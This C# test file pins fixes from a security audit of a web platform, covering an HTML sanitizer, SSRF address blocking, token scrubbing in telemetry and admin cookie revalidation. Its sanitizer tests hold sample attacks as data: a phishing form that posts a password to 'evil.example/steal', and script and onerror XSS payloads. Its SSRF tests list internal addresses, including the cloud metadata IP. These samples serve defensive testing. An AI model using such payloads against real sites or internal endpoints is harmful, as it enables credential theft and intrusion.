using System;
using System.Linq;
using System.Net;
using IPRO.Business.Services;
using IPRO.DataAccess.Repositories;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Configuration;
using IPRO.Entities;
using IPRO.Utility;
using IPRO.Web.Infrastructure;
using Microsoft.ApplicationInsights.DataContracts;
using Xunit;

namespace IPRO.IntegrationTests;

// The 2026-08-20 medium-severity batch. Each region pins one finding closed on
// fix/audit-medium-seven so it cannot quietly reopen.
public class MediumAuditFixTests
{
    // ---------------------------------------------------------- A5-M-SANITIZER + DEP-AngleSharp --
    // The sanitizer must strip what a phishing email needs (form controls, overlay positioning)
    // while keeping the inline formatting real newsletters are built from. These tests also stand
    // guard over the HtmlSanitizer 9.0.967 -> 9.2.995 / AngleSharp 0.17.1 -> 1.7.1 upgrade: if the
    // new parser changed basic sanitisation behaviour, they fail loudly.

    [Theory]
    [InlineData("<form action='https://evil.example/steal'><input name='password'></form>")]
    [InlineData("<button onclick='x'>Log in again</button>")]
    [InlineData("<select><option>a</option></select><textarea>x</textarea>")]
    public void Form_controls_do_not_survive_sanitisation(string html)
    {
        var outp = HtmlContentSanitizer.Sanitize(html).ToLowerInvariant();
        Assert.DoesNotContain("<form", outp);
        Assert.DoesNotContain("<input", outp);
        Assert.DoesNotContain("<button", outp);
        Assert.DoesNotContain("<select", outp);
        Assert.DoesNotContain("<textarea", outp);
    }

    [Fact]
    public void Overlay_positioning_is_stripped_from_inline_style()
    {
        var outp = HtmlContentSanitizer.Sanitize(
            "<div style=\"position:fixed;top:0;left:0;z-index:9999;color:#333\">overlay</div>");
        Assert.DoesNotContain("position", outp, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("z-index", outp, StringComparison.OrdinalIgnoreCase);
        // ...but ordinary formatting on the same element survives.
        Assert.Contains("color", outp, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Newsletter_formatting_survives()
    {
        var outp = HtmlContentSanitizer.Sanitize(
            "<table><tr><td style=\"padding:8px;background-color:#f0f0f0\"><b>Hi</b> <a href=\"https://example.com\">link</a> <img src=\"https://example.com/x.png\" alt=\"\"></td></tr></table>");
        Assert.Contains("<table", outp);
        Assert.Contains("<b>", outp);
        Assert.Contains("href", outp);
        Assert.Contains("<img", outp);
        Assert.Contains("padding", outp);
    }

    [Fact]
    public void Script_still_dies_after_the_parser_upgrade()
    {
        var outp = HtmlContentSanitizer.Sanitize("<p>x</p><script>alert(1)</script><img src=x onerror=alert(1)>");
        Assert.DoesNotContain("script", outp, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onerror", outp, StringComparison.OrdinalIgnoreCase);
    }

    // ----------------------------------------------------------------------------- A5-M-SSRF --

    [Theory]
    [InlineData("127.0.0.1")]
    [InlineData("10.0.0.5")]
    [InlineData("172.16.1.1")]
    [InlineData("192.168.1.10")]
    [InlineData("169.254.169.254")]
    [InlineData("100.64.0.1")]
    [InlineData("0.0.0.0")]
    [InlineData("::1")]
    [InlineData("fe80::1")]
    [InlineData("fd00::1")]
    public void Internal_addresses_are_blocked(string ip) =>
        Assert.True(PublicHostGuard.IsBlockedAddress(IPAddress.Parse(ip)));

    [Theory]
    [InlineData("8.8.8.8")]
    [InlineData("104.16.1.1")]
    [InlineData("2607:f8b0:4004:800::200e")]
    // 40.89.19.0 is what every production *.247advisers.com and app.iproadvisers.com hostname
    // resolved to on 2026-08-20 -- the guard must never flag the platform's own Azure front end,
    // or the 5-minute domain job would mark every working custom domain Failed.
    [InlineData("40.89.19.0")]
    public void Public_addresses_are_allowed(string ip) =>
        Assert.False(PublicHostGuard.IsBlockedAddress(IPAddress.Parse(ip)));

    [Fact]
    public void An_ip_literal_hostname_is_refused_but_a_domain_is_not()
    {
        Assert.True(PublicHostGuard.IsBlockedHost("169.254.169.254"));
        Assert.True(PublicHostGuard.IsBlockedHost("[::1]"));
        Assert.True(PublicHostGuard.IsBlockedHost("  127.0.0.1. "));
        Assert.False(PublicHostGuard.IsBlockedHost("www.example.com"));
        // A PUBLIC IP literal is not blocked by shape alone -- the resolved-address screen decides.
        Assert.False(PublicHostGuard.IsBlockedHost("8.8.8.8"));
    }

    [Fact]
    public void One_internal_address_in_a_resolved_set_blocks_the_set() =>
        Assert.True(PublicHostGuard.AnyBlocked(new[] { IPAddress.Parse("104.16.1.1"), IPAddress.Parse("10.0.0.9") }));

    // --------------------------------------------------------------------------- SO-M-NEW-6 --

    private static RequestTelemetry Scrub(string url, string? name = null)
    {
        var t = new RequestTelemetry { Url = new Uri(url) };
        if (name != null) t.Name = name;
        new SensitiveDataTelemetryInitializer().Initialize(t);
        return t;
    }

    [Fact]
    public void Invoice_path_tokens_are_scrubbed()
    {
        var t = Scrub("https://app.iproadvisers.com/invoice/SECRETTOKEN123", "GET /invoice/SECRETTOKEN123");
        Assert.DoesNotContain("SECRETTOKEN123", t.Url.ToString());
        Assert.Contains("/invoice/REDACTED", t.Url.ToString());
        Assert.DoesNotContain("SECRETTOKEN123", t.Name);
    }

    [Fact]
    public void Testimonial_path_tokens_are_scrubbed_including_subpaths()
    {
        Assert.Contains("/testimonial/REDACTED", Scrub("https://x.example/testimonial/tok123").Url.ToString());
        var approve = Scrub("https://x.example/invoice/tok123/approve");
        Assert.Contains("/invoice/REDACTED/approve", approve.Url.ToString());
    }

    [Fact]
    public void Query_tokens_are_still_scrubbed_and_unrelated_urls_untouched()
    {
        Assert.Contains("token=REDACTED", Scrub("https://x.example/email-preferences?token=abc&x=1").Url.ToString());
        var untouched = "https://x.example/portal/Dashboard?tab=2";
        Assert.Equal(untouched, Scrub(untouched).Url.ToString());
    }

    // ------------------------------------------------------------------------------ ADMIN-7 --

    [Fact]
    public void A_missing_or_deactivated_admin_is_rejected()
    {
        Assert.Equal(IPRO.Admin.Infrastructure.AdminCookieRevalidator.PrincipalVerdict.Reject,
            IPRO.Admin.Infrastructure.AdminCookieRevalidator.Evaluate(null, AdminRoles.SuperAdmin));
        Assert.Equal(IPRO.Admin.Infrastructure.AdminCookieRevalidator.PrincipalVerdict.Reject,
            IPRO.Admin.Infrastructure.AdminCookieRevalidator.Evaluate(
                new AdminUser { IsActive = false, Role = AdminRoles.SuperAdmin }, AdminRoles.SuperAdmin));
    }

    [Fact]
    public void A_role_change_invalidates_the_cookie_in_both_directions()
    {
        var demoted = new AdminUser { IsActive = true, Role = AdminRoles.Support };
        Assert.Equal(IPRO.Admin.Infrastructure.AdminCookieRevalidator.PrincipalVerdict.Reject,
            IPRO.Admin.Infrastructure.AdminCookieRevalidator.Evaluate(demoted, AdminRoles.SuperAdmin));
        var promoted = new AdminUser { IsActive = true, Role = AdminRoles.SuperAdmin };
        Assert.Equal(IPRO.Admin.Infrastructure.AdminCookieRevalidator.PrincipalVerdict.Reject,
            IPRO.Admin.Infrastructure.AdminCookieRevalidator.Evaluate(promoted, AdminRoles.Support));
    }

    [Fact]
    public void An_unchanged_active_admin_passes()
    {
        Assert.Equal(IPRO.Admin.Infrastructure.AdminCookieRevalidator.PrincipalVerdict.Ok,
            IPRO.Admin.Infrastructure.AdminCookieRevalidator.Evaluate(
                new AdminUser { IsActive = true, Role = AdminRoles.SuperAdmin }, AdminRoles.SuperAdmin));
    }

    // ----------------------------------------------------------------- ADMIN-10 (source walk) --

    [Fact]
    public void RebuildResources_requires_the_SuperAdmin_policy()
    {
        var method = typeof(IPRO.Admin.Controllers.AgentsController).GetMethod("RebuildResources");
        Assert.NotNull(method);
        var attrs = method!.GetCustomAttributes(typeof(Microsoft.AspNetCore.Authorization.AuthorizeAttribute), false)
            .Cast<Microsoft.AspNetCore.Authorization.AuthorizeAttribute>();
        Assert.Contains(attrs, a => a.Policy == "SuperAdmin");
    }
    // ---------------------------------------------------------------- M-9 (the job, really run) --
    // Not just "the bulk method exists": the REAL OverdueInvoiceReminderJob runs against a real
    // database and a recording email fake. Entitled agent's overdue invoice -> one reminder +
    // marker stamped; unentitled agent's -> nothing; recently-reminded -> nothing.

    [Fact]
    public async System.Threading.Tasks.Task Overdue_job_reminds_only_entitled_agents_and_stamps_the_marker()
    {
        await using var testDb = await TestDatabase.CreateAsync(applyLedgerGuard: false);
        await using var db = testDb.CreateContext();

        var entitled = await SeedAgentWithBillingAsync(db, "ent", includeInvoicing: true);
        var unentitled = await SeedAgentWithBillingAsync(db, "no", includeInvoicing: false);
        var due = await SeedOverdueInvoiceAsync(db, entitled, "INV-A", lastReminded: null);
        var skippedAgent = await SeedOverdueInvoiceAsync(db, unentitled, "INV-B", lastReminded: null);
        var recentlyReminded = await SeedOverdueInvoiceAsync(db, entitled, "INV-C", lastReminded: DateTime.UtcNow.AddHours(-2));
        db.ChangeTracker.Clear();

        var email = new RecordingEmailService();
        var job = new IPRO.Scheduler.OverdueInvoiceReminderJob(
            db,
            new IPRO.Business.Services.PackageEntitlementService(new UnitOfWork(db), db),
            email,
            new ConfigurationBuilder().AddInMemoryCollection().Build(),
            Microsoft.Extensions.Logging.Abstractions.NullLogger<IPRO.Scheduler.OverdueInvoiceReminderJob>.Instance);
        await job.RunAsync();

        var sent = Assert.Single(email.Sent);
        Assert.Contains("INV-A", sent.Subject);

        var rows = await db.ClientInvoices.AsNoTracking().ToListAsync();
        Assert.NotNull(rows.Single(i => i.Id == due).LastReminderSentAt);
        Assert.Null(rows.Single(i => i.Id == skippedAgent).LastReminderSentAt);
    }

    private static async System.Threading.Tasks.Task<int> SeedAgentWithBillingAsync(IPRO.DataAccess.IPRODbContext db, string tag, bool includeInvoicing)
    {
        var rule = new BillingRule { PackageName = ($"M9-{tag}-{Guid.NewGuid():N}")[..20], MonthlyPrice = 40m };
        db.Add(rule);
        await db.SaveChangesAsync();
        if (includeInvoicing)
        {
            db.Add(new PackageFeature { BillingRuleId = rule.Id, FeatureCode = PackageFeatureCodes.ClientInvoicing, FeatureName = "Client invoicing", IsIncluded = true });
        }
        var agent = new AgentUser
        {
            UserName = ($"m9{tag}-{Guid.NewGuid():N}")[..20],
            Email = $"{tag}@example.test",
            FirstName = "M9",
            LastName = tag,
            CompanyName = "M9 Co",
            DomainName = ($"m9{tag}-{Guid.NewGuid():N}")[..24],
            PackageId = rule.Id
        };
        db.Add(agent);
        await db.SaveChangesAsync();
        db.Add(new IPRO.Entities.Billing
        {
            AgentUserId = agent.Id, BillingRuleId = rule.Id, PayPalSubscriptionId = "M9-TEST", PayPalPlanId = "M9-TEST",
            Amount = 40m, Currency = "CAD", Status = BillingStatus.Active, Period = BillingPeriod.Monthly,
            StartDate = DateTime.UtcNow.AddMonths(-1), CreatedAt = DateTime.UtcNow
        });
        await db.SaveChangesAsync();
        return agent.Id;
    }

    private static async System.Threading.Tasks.Task<int> SeedOverdueInvoiceAsync(IPRO.DataAccess.IPRODbContext db, int agentId, string number, DateTime? lastReminded)
    {
        var client = new Client
        {
            AgentUserId = agentId, FirstName = "Cli", LastName = number,
            Email = $"{number.ToLowerInvariant()}@example.test"
        };
        db.Clients.Add(client);
        await db.SaveChangesAsync();
        var invoice = new ClientInvoice
        {
            AgentUserId = agentId, ClientId = client.Id,
            DocumentType = ClientInvoiceDocumentType.Invoice, Status = ClientInvoiceStatus.Sent,
            DocumentNumber = number, DueDate = DateTime.UtcNow.Date.AddDays(-3),
            Total = 100m, Currency = "CAD", ViewToken = Guid.NewGuid().ToString("N"),
            LastReminderSentAt = lastReminded
        };
        db.ClientInvoices.Add(invoice);
        await db.SaveChangesAsync();
        return invoice.Id;
    }

    private sealed class RecordingEmailService : IPRO.Email.IEmailService
    {
        public System.Collections.Generic.List<(string To, string Subject)> Sent { get; } = new();
        public System.Threading.Tasks.Task<bool> SendAsync(string toEmail, string toName, string subject, string htmlBody, string? textBody = null, System.Collections.Generic.IDictionary<string, string>? customArgs = null, string? replyToEmail = null, string? replyToName = null, string? listUnsubscribeUrl = null)
        { Sent.Add((toEmail, subject)); return System.Threading.Tasks.Task.FromResult(true); }
        public System.Threading.Tasks.Task<IPRO.Email.EmailSendResult> SendDetailedAsync(string toEmail, string toName, string subject, string htmlBody, string? textBody = null, System.Collections.Generic.IDictionary<string, string>? customArgs = null, string? replyToEmail = null, string? replyToName = null, string? listUnsubscribeUrl = null)
        { Sent.Add((toEmail, subject)); return System.Threading.Tasks.Task.FromResult(IPRO.Email.EmailSendResult.Sent()); }
        public System.Threading.Tasks.Task<bool> SendBulkAsync(System.Collections.Generic.IEnumerable<IPRO.Email.EmailRecipient> recipients, string subject, string htmlBody, string? textBody = null)
            => System.Threading.Tasks.Task.FromResult(true);
        public System.Threading.Tasks.Task<bool> SendTemplateAsync(string toEmail, string toName, string templateId, object templateData)
            => System.Threading.Tasks.Task.FromResult(true);
    }
}
